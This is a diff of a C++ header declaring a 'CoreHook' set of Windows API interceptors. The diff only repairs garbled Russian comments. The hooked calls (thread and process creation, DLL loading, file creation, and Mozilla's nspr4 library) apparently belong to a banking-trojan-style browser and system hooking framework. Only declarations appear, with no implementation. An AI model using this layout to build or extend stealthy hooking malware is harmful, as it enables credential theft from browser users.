@@ -1,5 +1,5 @@
 /*
-  РҐСѓРєРё СЏРґСЂР°.
+  Хуки ядра.
 */
 #pragma once
 
@@ -8,31 +8,31 @@
 namespace CoreHook
 {
   /*
-    РРЅРёС†РёР°Р»РёР·Р°С†РёСЏ.
+    Инициализация.
   */
   void init(void);
 
   /*
-    Р”РµРёРЅРёС†РёР°Р»РёР·Р°С†РёСЏ.
+    Деинициализация.
   */
   void uninit(void);
 
   /*
-    РћС‚РєР»СЋС‡РёС‚СЊ РїРµСЂРµС…РІР°С‚С‡РёРє РѕС‚РєСЂС‚РёСЏ С„Р°Р№Р»Р° РґР»СЏ С‚РµРєСѓС‰РµРіРѕ РїРѕС‚РѕРєР°.
+    Отключить перехватчик откртия файла для текущего потока.
 
-    IN disable - true - РѕС‚РєР»СЋС‡РёС‚СЊ, false - РІРєР»СЋС‡РёС‚СЊ.
+    IN disable - true - отключить, false - включить.
   */
   void disableFileHookerForCurrentThread(bool disable);
   
   /*
-    РЈСЃС‚Р°РЅРѕРІРєР° С„Р»Р°РіРѕРІ Core::CDPF_* РґР»СЏ СЃРѕР·РґР°РЅРёСЏ РґРѕС‡РµСЂРЅРѕРіРѕ РїСЂРѕС†РµСЃСЃР° РёР· С‚РµРєСѓС‰РµРіРѕ РїРѕС‚РѕРєР°. Р¤Р»Р°Рі
-    СЃР±СЂР°СЃС‹РІР°РµС‚СЃСЏ РІ СЃР»СѓС‡Р°Рё СѓСЃРїРµС€РЅРѕРіРѕ СЃРѕР·РґР°РЅРёСЏ РїСЂРѕС†РµСЃСЃР°.
+    Установка флагов Core::CDPF_* для создания дочерного процесса из текущего потока. Флаг
+    сбрасывается в случаи успешного создания процесса.
 
-    IN processFlags - Core::CDPF_*. Р¤Р»Р°РіРё РїРѕ РјР°СЃРєРµ Core::CDPT_INHERITABLE_MASK РІСЃРµСЂР°РІРЅРѕ Р±СѓРґСѓС‚
-                      СѓРЅР°СЃР»РµРґРѕРІР°РЅС‹.
+    IN processFlags - Core::CDPF_*. Флаги по маске Core::CDPT_INHERITABLE_MASK всеравно будут
+                      унаследованы.
 
-    Return          - true - РІ СЃСѓР»С‡Р°Рё СѓСЃРїРµС…Р°,
-                      false - РІ СЃР»СѓС‡Р°Рё РїСЂРѕРІР°Р»Р°.
+    Return          - true - в сулчаи успеха,
+                      false - в случаи провала.
   */
 #if defined HOOKER_SETCHILDPROCESSFLAGS
   bool setChildProcessFlags(DWORD processFlags);
@@ -40,44 +40,44 @@ namespace CoreHook
 
 #if(BO_NSPR4 > 0)
   /*
-    Р¤СѓРЅРєС†С†РёСЏ РґР»СЏ СѓС‚СЃР°РЅРѕРІРєРё РјРµС‚РєРё, С‡С‚Рѕ nspr4 СѓСЃРїРµС€РЅРѕ РїРµСЂРµС…РІР°С‡РµРЅ Рё РЅРµ РЅСѓР¶РЅРѕ РµРіРѕ РѕС‚СЃР»РµР¶РёРІР°С‚СЊ РІ
+    Функцция для утсановки метки, что nspr4 успешно перехвачен и не нужно его отслеживать в
     hookerLdrLoadDll.
   */
   void __forceinline markNspr4AsHooked(void);
 #endif
 
   /*
-    РџРµСЂРµС…РІР°С‚С‡РёРє NtCreateThread.
+    Перехватчик NtCreateThread.
   */  
   NTSTATUS NTAPI hookerNtCreateThread(PHANDLE threadHandle, ACCESS_MASK desiredAccess, POBJECT_ATTRIBUTES objectAttributes, HANDLE processHandle, PCLIENT_ID clientId, PCONTEXT threadContext, PINITIAL_TEB initialTeb, BOOLEAN createSuspended);
 
   /*
-    РџРµСЂРµС…РІР°С‚С‡РёРє NtCreateUserProcess.
+    Перехватчик NtCreateUserProcess.
   */
   NTSTATUS NTAPI hookerNtCreateUserProcess(PHANDLE processHandle, PHANDLE threadHandle, ACCESS_MASK processDesiredAccess, ACCESS_MASK threadDesiredAccess, POBJECT_ATTRIBUTES processObjectAttributes, POBJECT_ATTRIBUTES threadObjectAttributes, ULONG createProcessFlags, ULONG createThreadFlags, PVOID processParameters, PVOID parameter9, PVOID attributeList);
 
   /*
-    РџРµСЂРµС…РІР°С‚С‡РёРє LdrLoadDll.
+    Перехватчик LdrLoadDll.
   */
 #if defined(HOOKER_LDRLOADDLL)
   NTSTATUS NTAPI hookerLdrLoadDll(PWCHAR pathToFile, ULONG flags, PUNICODE_STRING moduleFileName, PHANDLE moduleHandle);
 #endif  
 
   /*
-    РџРµСЂРµС…РІР°С‚С‡РёРє NtQueryDirectoryFile.
+    Перехватчик NtQueryDirectoryFile.
   */
 #if(0)
   NTSTATUS NTAPI hookerNtQueryDirectoryFile(HANDLE fileHandle, HANDLE eventHandle, PIO_APC_ROUTINE apcRoutine, PVOID apcContext, PIO_STATUS_BLOCK ioStatusBlock, PVOID fileInformation, ULONG length, FILE_INFORMATION_CLASS fileInformationClass, BOOLEAN returnSingleEntry, PUNICODE_STRING fileName, BOOLEAN restartScan);
 #endif
 
   /*
-    РџРµСЂРµС…РІР°С‚С‡РёРє NtCreateFile.
+    Перехватчик NtCreateFile.
   */
 #if defined(HOOKER_NTCREATEFILE)
   NTSTATUS NTAPI hookerNtCreateFile(PHANDLE fileHandle, ACCESS_MASK desiredAccess, POBJECT_ATTRIBUTES objectAttributes, PIO_STATUS_BLOCK ioStatusBlock, PLARGE_INTEGER allocationSize, ULONG fileAttributes, ULONG shareAccess, ULONG createDisposition, ULONG createOptions, PVOID eaBuffer, ULONG eaLength);
 #endif
 
-  /*Р’В Р’В Р’В Р’В Interceptor GetFileAttributesExW
-Р’В Р’В */
+  /*В В В В Interceptor GetFileAttributesExW
+В В */
   BOOL WINAPI hookerGetFileAttributesExW(LPCWSTR fileName, GET_FILEEX_INFO_LEVELS infoLevelId, LPVOID fileInformation);
 };
